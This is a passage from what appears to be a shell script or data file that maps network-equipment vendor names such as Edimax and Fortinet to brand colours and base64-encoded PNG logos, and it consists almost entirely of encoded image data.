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'
										["Edimax"]='#BD1C21 #231815 #D6D6D6 data:image/png;base64,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'
										["Fortinet"]='#77B81E #C7C7C7 #3D3D3D data:image/png;base64,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